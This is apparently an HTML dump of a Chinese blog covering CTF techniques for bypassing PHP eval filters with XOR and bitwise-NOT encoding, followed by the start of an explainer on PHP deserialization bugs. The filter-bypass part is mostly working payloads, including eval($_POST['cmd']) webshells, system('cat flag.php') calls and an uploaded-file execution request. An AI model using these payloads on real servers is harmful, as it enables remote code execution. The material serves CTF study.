class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$____.=$__;</span><br><span class="line">$__=$_;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$____.=$__;$_=$$____;$___($_[_]);</span><br></pre></td></tr></table></figure>

<p>post传参</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_=phpinfo();</span><br></pre></td></tr></table></figure>

<h1 id="无字符绕过-提高篇"><a href="#无字符绕过-提高篇" class="headerlink" title="无字符绕过(提高篇)"></a><strong>无字符绕过(提高篇)</strong></h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里比上面多了两个限制</p>
<ul>
<li>webshell长度不超过35位</li>
<li>除了不包含字母数字，还不能包含<code>$</code>和<code>_</code></li>
</ul>
<p><strong>php7.2下简单解决问题</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<p><strong>php5的思考</strong></p>
<p>如果我们用上面7.2的exp会报错，原因就是php5并不支持这种表达方式。</p>
<p><strong>PHP5+shell打破禁锢</strong></p>
<p>这里只能是在linux的情况下使用。这里没有复现成功，直接用P神离别歌的图了。</p>
<p>“反引号”是PHP中最简单的执行shell的方法。</p>
<p><code>.file</code>能用bash执行file文件中的命令。如果我们POST发送上传一个文件，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p>
<p>此时就可以用到Linux下的glob通配符：</p>
<ul>
<li><p><code>*</code>可以代替0个及以上任意字符</p>
</li>
<li><p><code>?</code>可以代表1个任意字符</p>
</li>
<li><p><code>[^x]</code>的方法来构造”这个位置不是字符x”。</p>
</li>
<li><p><code>[@-[]</code>来表示大写字母。</p>
</li>
</ul>
<p>最后，我传入的code为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;. &#x2F;???&#x2F;????????[@-[]&#96;;?&gt;</span><br></pre></td></tr></table></figure>

<p>发送数据包如下：</p>
<img src="https://www.leavesongs.com/media/attachment/2018/10/06/56de7887-0a22-4b06-9ccd-2951a4bdab4c.png" style="high:120%;width:120%;" />

<h1 id="无字符绕过-例题"><a href="#无字符绕过-例题" class="headerlink" title="无字符绕过(例题)"></a><strong>无字符绕过(例题)</strong></h1><h2 id="例子一（异或）"><a href="#例子一（异或）" class="headerlink" title="例子一（异或）"></a><strong>例子一（异或）</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]) )&#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这里看到<code>~</code>被过滤了，所以上面提到的取反绕过就不能用了。但是这里的话并没有过滤<code>$</code>。所以可以使用异或的方式绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urldecode(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line">$b = urldecode(<span class="string">&#x27;%a0%b8%ba%ab&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a^$b;</span><br><span class="line"><span class="comment">//输出_GET</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?a=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure>

<p>构造webshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?a=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%a0&#125;($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%a1&#125;);&amp;%a0=assert&amp;%a1=eval($_POST[%27cmd%27])</span><br><span class="line">//$&#123;_GET&#125;&#123;%a0&#125;($&#123;_GET&#125;&#123;%a1&#125;);&amp;%a0=<span class="keyword">assert</span>&amp;%a1=eval($_POST[%<span class="number">27</span>cmd%<span class="number">27</span>])</span><br></pre></td></tr></table></figure>

<p>这里有一点要注意的就是P神在提高篇里面说到的，如果这道题目是PHP７版本的话，是可以用取反加上异或的方式去做的，但是如果本题是PHP5.6版本的话，因为不支持这种表达方式就做不了。</p>
<h2 id="例子二（取反）"><a href="#例子二（取反）" class="headerlink" title="例子二（取反）"></a><strong>例子二（取反）</strong></h2><p>[ISITDTU 2019]EasyPHP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这一题过滤的东西比较多，把<code>$</code>过滤了，但是没有过滤<code>~</code>，可以用取反的方式。</p>
<p>但是第二个过滤，<code>strtolower</code>将字符串转换为小写，用<code>count_chars</code>返回由所有使用了的字节值组成的字符串，再判断其中每个字符累计出现次数是否大于 13。</p>
<p>查看phpinfo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?_=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<img src="http://goodcheerleung.gitee.io/blog/微信截图_20200717104946.png" style="high:80%;width:80%;" />

<p>构造shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=<span class="string">&#x27;(eval($_POST[cmd]))&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$c);</span><br><span class="line"><span class="comment">//%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"><span class="comment">//%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);</span><br></pre></td></tr></table></figure>

<p>但是这里的话构造shell第二个过滤过不去，而且网上没看到有writeup有构造shell的，看到都是取反异或构造函数去找flag，这里又恰好是PHP7的版本，可以使用这种方式，这里贴一下解题过程</p>
<ul>
<li>取反异或</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">((%<span class="number">8</span>f%<span class="number">8</span>d%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>b%a0%<span class="number">8</span>d)^(%ff%ff%ff%ff%ff%ff%ff))(((%<span class="number">8</span>c%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">91</span>%<span class="number">9</span>b%<span class="number">96</span>%<span class="number">8</span>d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br><span class="line">//print_r(scandir(<span class="string">&#x27;.&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>count_chars过不去，需要缩减字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">((%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>c)^(%<span class="number">9</span>b%<span class="number">8</span>f%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>c%<span class="number">9</span>b%<span class="number">8</span>f)^(%<span class="number">8</span>f%<span class="number">9</span>e%<span class="number">96</span>%<span class="number">96</span>%<span class="number">8</span>c%a0%<span class="number">9</span>e)^(%ff%ff%ff%ff%ff%ff%ff))(((%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>c)^(%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>c%a0%<span class="number">9</span>b%<span class="number">8</span>f)^(%<span class="number">8</span>c%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">96</span>%a0%<span class="number">96</span>%<span class="number">9</span>e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<p>回显</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; index.php [3] =&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt ) </span><br></pre></td></tr></table></figure>

<p>读文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">((%<span class="number">8</span>d%<span class="number">9</span>c%<span class="number">97</span>%a0%<span class="number">88</span>%<span class="number">8</span>d%<span class="number">97</span>%<span class="number">8</span>d%<span class="number">9</span>c%a0%a0)^(%<span class="number">9</span>a%<span class="number">97</span>%<span class="number">9</span>b%<span class="number">88</span>%a0%<span class="number">9</span>a%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">8</span>d%<span class="number">9</span>c%<span class="number">9</span>a)^(%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>c%a0%<span class="number">88</span>%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>c%<span class="number">9</span>c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%<span class="number">97</span>%<span class="number">8</span>d)^(%<span class="number">9</span>a%<span class="number">9</span>a%<span class="number">9</span>b)^(%a0%<span class="number">9</span>c%<span class="number">8</span>d)^(%ff%ff%ff))(((%<span class="number">8</span>d%a0%<span class="number">88</span>%<span class="number">97</span>%<span class="number">8</span>d%<span class="number">9</span>b%<span class="number">9</span>c)^(%<span class="number">9</span>a%<span class="number">9</span>c%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">9</span>b%<span class="number">9</span>a%<span class="number">8</span>d)^(%<span class="number">9</span>b%a0%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">8</span>d%<span class="number">97</span>%<span class="number">9</span>c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br><span class="line">//show_source(end(scandir(.)));</span><br></pre></td></tr></table></figure>

<h2 id="例子三"><a href="#例子三" class="headerlink" title="例子三"></a><strong>例子三</strong></h2><p>第五空间hate-php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(f|l|a|g|\.|p|h|\/|;|\&quot;|\&#x27;|\`|\||\[|\]|\_|=)/i&#x27;</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You are too good for me&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;You deserve better&#x27;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>第一个正则过滤了一些符号了flag.ph中任意的字符，第二个<code>foreach</code>过滤了所有内置函数</p>
<ul>
<li>exp1</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?code=(~%8C%86%8C%8B%9A%92)($&#123;%a7%ae%ac%ac^%f8%e9%e9%f8&#125;&#123;%a7&#125;)&amp;%a7=cat%20flag.php</span><br><span class="line">//system(&#123;_GET&#125;&#123;%a7&#125;)&amp;%a7=cat%<span class="number">20</span>flag.php</span><br></pre></td></tr></table></figure>

<ul>
<li>exp2</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?code=$&#123;~%a0%b8%ba%ab&#125;&#123;%a0&#125;($&#123;~%a0%b8%ba%ab&#125;&#123;%a1&#125;)&amp;%a0=highlight_file&amp;%a1=flag.php</span><br><span class="line">//?code=$&#123;_GET&#125;&#123;%a0&#125;($&#123;_GET&#125;&#123;%a1&#125;)&amp;%a0=highlight_file&amp;%a1=flag.php</span><br></pre></td></tr></table></figure>

<ul>
<li>exp3</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?code=(~(%8c%86%8c%8b%9a%92))((~(%9a%91%9b))((~(%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c))()))</span><br><span class="line">//?code=(system)((end)((getallheaders)()))</span><br><span class="line">//?code=system(end(getallheaders()))</span><br><span class="line">//需要请求头添加</span><br><span class="line">kawhi: cat flag.php</span><br></pre></td></tr></table></figure>

<p>题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;evil&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($_GET[<span class="string">&#x27;evil&#x27;</span>])&gt;<span class="number">25</span>||preg_match(<span class="string">&quot;/[\w$=()&lt;&gt;&#x27;\&quot;]/&quot;</span>, $_GET[<span class="string">&#x27;evil&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;danger!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;evil&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?evil&#x3D;&#96;.+&#x2F;???&#x2F;????????[@-[]&#96;; HTTP&#x2F;1.1</span><br><span class="line">Host: 47.98.234.232:28000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Linux; Android 10; VOG-AL10 Build&#x2F;HUAWEIVOG-AL10; wv) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Version&#x2F;4.0 Chrome&#x2F;77.0.3865.120 MQQBrowser&#x2F;6.2 TBS&#x2F;045331 Mobile Safari&#x2F;537.36 MMWEBID&#x2F;9471 MicroMessenger&#x2F;7.0.19.1760(0x27001339) Process&#x2F;tools WeChat&#x2F;arm64 NetType&#x2F;WIFI</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------367263770318294676713873117171</span><br><span class="line">Content-Length: 241</span><br><span class="line">Origin: http:&#x2F;&#x2F;106.55.148.151:31002</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;106.55.148.151:31002&#x2F;index.php?file&#x3D;abc.txt</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">-----------------------------367263770318294676713873117171</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file1&quot;; filename&#x3D;&quot;abc.txt&quot;</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">ls &#x2F; &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;hello</span><br><span class="line">-----------------------------367263770318294676713873117171--</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>反序列化漏洞总结</title>
    <url>/2020/05/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>最近在buu刷题，遇到到了一些关于反序列化的题目，这里做一个总结。</p>
<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a><strong>PHP反序列化漏洞</strong></h1><h2 id="序列化和反序列化是什么？"><a href="#序列化和反序列化是什么？" class="headerlink" title="序列化和反序列化是什么？"></a><strong>序列化和反序列化是什么？</strong></h2><blockquote>
<p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 ——php官方文档</p>
</blockquote>
<p>序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。</p>
<p>我们通常把<strong>字符串/数组/对象</strong>进行序列化，然后再反序列化被序列化的<strong>字符串/数组/对象</strong>。</p>
<p>首先举一个简单的例子</p>
<img src="http://img.kawhi.xyz/image-20200711120132680.png" style="high:80%;width:80%;" />

<p><strong>分析一下序列化之后的含义</strong></p>
<p><strong>字符串：</strong></p>
<p><code>$a=&quot;test&quot;;</code> 序列化后的结果是<code>s:4:&quot;test&quot;;</code></p>
<p>其中s代表string类型，4代表字符串长度，”test”代表字符串内容。</p>
<p><strong>数组：</strong></p>
<p><code>$arr = array(&#39;c&#39; =&gt; &#39;cat&#39; ,&#39;d&#39;=&gt; &#39;dog&#39;);</code>序列化后的结果是<code>a:2:&#123;s:1:&quot;c&quot;;s:3:&quot;cat&quot;;s:1:&quot;d&quot;;s:3:&quot;dog&quot;;&#125;</code></p>
<p>其中a代表array数组类型,2代表数组长度为2个，s代表string，3代表字符串长度，cat是字符串内容，依此类推。</p>
<p><strong>对象：</strong></p>
<p><code>class ABC&#123;public $name=&quot;kawhi&quot; ;&#125;</code>创建对象后，序列化后的结果是<code>O:3:&quot;ABC&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;kawhi&quot;;&#125;</code></p>
<p>其中O表示存储的对象(object类型)，3代表对象名称有3个字符，即ABC，1表示有一个值，s代表string类型，4代表字符串长度，name代表字符串名称，依此类推。</p>
<p>如果在被序列化的对象中加入一些恶意的代码，如XSS弹窗，那么在进行反序列化的时候就相当于解码操作，然后会自动执行。</p>
<img src="http://img.kawhi.xyz/image-20200711121735182.png" style="high:80%;width:80%;" />

<h2 id="结合魔法函数构造poc链"><a href="#结合魔法函数构造poc链" class="headerlink" title="结合魔法函数构造poc链"></a><strong>结合魔法函数构造poc链</strong></h2><p>通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：</p>
<p><code>__construct</code> 当一个对象创建时自动调用</p>
<p><code>__wakeup</code> 使用unserialse()函数时会自动调用</p>
<p><code>__destruct</code> 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)</p>
<p><code>__toString</code> 当一个对象被当作一个字符串被调用。</p>
<p><code>__sleep()</code> 使用serialize()函数时触发</p>
<p><code>__call()</code>  在对象上下文中调用不可访问的方法时触发 </p>
<p><code>__callStatic()</code> 在静态上下文中调用不可访问的方法时触发</p>
<p><code>__get()</code> 用于从不可访问的属性读取数据</p>
<p><code>__set()</code> 用于将数据写入不可访问的属性</p>
<p><code>__isset()</code> 在不可访问的属性上调用isset()或empty()触发 </p>
<p><code>__unset()</code> 在不可访问的属性上使用unset()时触发</p>
<p><code>__toString()</code> 把类当作字符串使用时触发,返回值需要为字符串</p>
<p><code>__invoke()</code> 当脚本尝试将对象调用为函数时触发</p>
<p>这里再看看一些常用的魔术是如何被调用的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $varr1 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $varr2 = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> test();<span class="comment">//实例化对象，调用__construct()方法，输出__construct</span></span><br><span class="line">$obj-&gt;echoP();    <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">echo</span> $obj;        <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line">$s =serialize($obj);   <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"><span class="keyword">echo</span> unserialize($s);  <span class="comment">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被 当做字符串，就会调用_toString()方法。 // 脚本结束又会调用__destruct()方法，输出__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里举一个<code>__wakeup</code>的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;kawhi&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到其中反序列化的a变量是可控的，并且一旦反序列化会自动执行魔法方法<code>__wakeup</code>并且输出test。</p>
<p>构造poc插入xss</p>
